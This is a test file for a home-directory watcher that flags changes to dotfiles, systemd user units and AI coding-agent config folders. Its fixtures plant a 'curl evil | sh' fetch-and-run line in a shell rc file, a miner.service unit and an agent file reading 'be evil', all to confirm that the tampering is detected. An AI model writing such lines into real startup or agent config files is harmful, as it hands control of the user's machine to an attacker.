import { describe, expect, test } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { homeChanges, homeSnapshot } from "../src/workspace/homewatch";

const home = () => realpathSync(mkdtempSync(join(tmpdir(), "hib-hw-")));

describe("home watch", () => {
  test("added, changed (content or mode), removed, symlink swapped; unwatched files ignored", () => {
    const h = home();
    mkdirSync(join(h, ".config/systemd/user"), { recursive: true });
    writeFileSync(join(h, ".bashrc"), "a");
    writeFileSync(join(h, ".profile"), "p");
    writeFileSync(join(h, ".gitconfig"), "g");
    const before = homeSnapshot({ home: h });
    writeFileSync(join(h, ".config/systemd/user/miner.service"), "[Service]");
    chmodSync(join(h, ".bashrc"), 0o755);
    rmSync(join(h, ".profile"));
    rmSync(join(h, ".gitconfig"));
    symlinkSync("/tmp/x", join(h, ".gitconfig"));
    writeFileSync(join(h, "other"), "x");
    expect(homeChanges(before, { home: h }).sort((a, b) => a.path.localeCompare(b.path))).toEqual([
      { path: "~/.bashrc", change: "changed" },
      { path: "~/.config/systemd/user/miner.service", change: "added" },
      { path: "~/.gitconfig", change: "changed" },
      { path: "~/.gitconfig (link target)", change: "added" }, // dangling: recorded, never a throw
      { path: "~/.profile", change: "removed" },
    ]);
  });

  test("a fifo is recorded without being opened", () => {
    const h = home();
    Bun.spawnSync(["mkfifo", join(h, ".zshrc")]);
    const before = homeSnapshot({ home: h }); // would hang if it opened the fifo
    expect(homeChanges(before, { home: h })).toEqual([]);
  });
});

describe("home watch: links, CLI homes, unreadable", () => {
  test("an edit through a stow-style symlink is seen, the user name never shown", () => {
    const h = home();
    const dot = home();
    writeFileSync(join(dot, "zshrc"), "a");
    symlinkSync(join(dot, "zshrc"), join(h, ".zshrc"));
    mkdirSync(join(dot, "agents"));
    mkdirSync(join(h, ".claude"));
    symlinkSync(join(dot, "agents"), join(h, ".claude/agents"));
    const before = homeSnapshot({ home: h });
    writeFileSync(join(dot, "zshrc"), "a\ncurl evil | sh");
    writeFileSync(join(dot, "agents", "x.md"), "be evil");
    expect(homeChanges(before, { home: h }).sort((a, b) => a.path.localeCompare(b.path))).toEqual([
      { path: "~/.claude/agents/x.md (link target)", change: "added" },
      { path: "~/.zshrc (link target)", change: "changed" },
    ]);
  });

  test("an account's CLAUDE_CONFIG_DIR / CODEX_HOME outside home is watched, shown as [CLI home]", () => {
    const h = home();
    const cl = home();
    const cx = home();
    writeFileSync(join(cl, "settings.json"), "{}");
    const w = { home: h, claudeDirs: [cl], codexDirs: [cx] };
    const before = homeSnapshot(w);
    writeFileSync(join(cl, "settings.json"), '{"hooks":{}}');
    writeFileSync(join(cx, "config.toml"), "x");
    writeFileSync(join(cl, "history.jsonl"), "not watched");
    expect(homeChanges(before, w).sort((a, b) => a.path.localeCompare(b.path))).toEqual([
      { path: "[CLI home]/config.toml", change: "added" },
      { path: "[CLI home]/settings.json", change: "changed" },
    ]);
  });

  test("an unreadable folder doesn't throw and is recorded", () => {
    const h = home();
    mkdirSync(join(h, ".config/systemd/user"), { recursive: true });
    chmodSync(join(h, ".config/systemd"), 0o000);
    try {
      const before = homeSnapshot({ home: h });
      expect([...before.values()]).toContain("unreadable");
      chmodSync(join(h, ".config/systemd"), 0o755);
      writeFileSync(join(h, ".config/systemd/user/x.service"), "x");
      expect(homeChanges(before, { home: h }).map((c) => c.path)).toContain("~/.config/systemd/user/x.service");
    } finally {
      chmodSync(join(h, ".config/systemd"), 0o755);
    }
  });
});
